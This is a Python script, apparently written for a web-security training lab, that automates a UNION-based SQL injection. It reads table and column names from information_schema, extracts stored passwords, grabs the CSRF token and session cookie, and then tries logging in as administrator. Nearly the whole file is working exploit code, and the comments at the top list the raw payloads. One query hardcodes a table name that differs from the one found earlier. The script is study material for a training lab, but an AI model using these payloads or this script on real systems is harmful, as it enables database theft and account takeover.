import re
import requests
from colorama import Fore

#1'ORDER+BY+2--   +True
#1'UNION+SELECT+null,version()-- --> Postgre
#1'UNION+SELECT+table_name,null+FROM+information_schema.tables--
#1'UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name+='users_agrmpp'--
#1'UNION+SELECT+password_kgopdt,username_ycntob+FROM+users_agrmpp--

LAB_URL="https://0a2c00b1043578d0825460cf00480044.web-security-academy.net"

def main():
    print(Fore.BLUE + "[1] Injecting payload to retrieve the users table")
    payload = "1'UNION+SELECT+table_name,null+FROM+information_schema.tables--"
    injection = fetch(f"/filter?category={payload}")
    username_table=re.findall("<th>(users_.*)</th>", injection.text)[0]
    print(Fore.WHITE + "Table name is " + Fore.GREEN + username_table)

    print(Fore.BLUE + "(2) Adjusting payload to retrieve username and password columns")
    payload= f"1'UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name+='{username_table}'--"
    injection = fetch(f"/filter?category={payload}")
    username_column=re.findall("<th>(username_.*)</th>", injection.text)[0]
    password_column=re.findall("<th>(password_.*)</th>", injection.text)[0]
    print(Fore.WHITE + "User column name is " + Fore.GREEN + username_column + "and " + Fore.WHITE + "password column name is " + Fore.GREEN + password_column)

    print(Fore.BLUE + "[3] Adjusting payload to retrieve the passwords")
    payload=f"1'UNION+SELECT+null,{password_column}+FROM+users_hgphqv--"
    injection=fetch(f"/filter?category={payload}")
    passwords = re.findall("<td>(.*)</td>", injection.text)[0:3]

    login_page= fetch("/login")
    print("[4] Extracting CSRf token & session cookie ...")
    
    session_token = login_page.cookies.get("session")
    csrf_token = re.findall(r'name="csrf" value="([^"]+)"', login_page.text)[0]
    #rint(csrf_token)
    #print(session_token)

    for password in passwords:
        print(Fore.BLUE + "Password found: " + Fore.GREEN + password)
        print(Fore.WHITE + "Trying to log as as the administrator.. ")
        data = {"username": "administrator", "password": password, "csrf": csrf_token }
        cookies = { "session": session_token }
        admin_login = post_data("/login", data, cookies)
        

def fetch(path, cookies=None):
    try:
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=True)
    except:
        print(Fore.RED + "[!]Error fetching " + LAB_URL + path)
        exit(1)

def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=True)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()

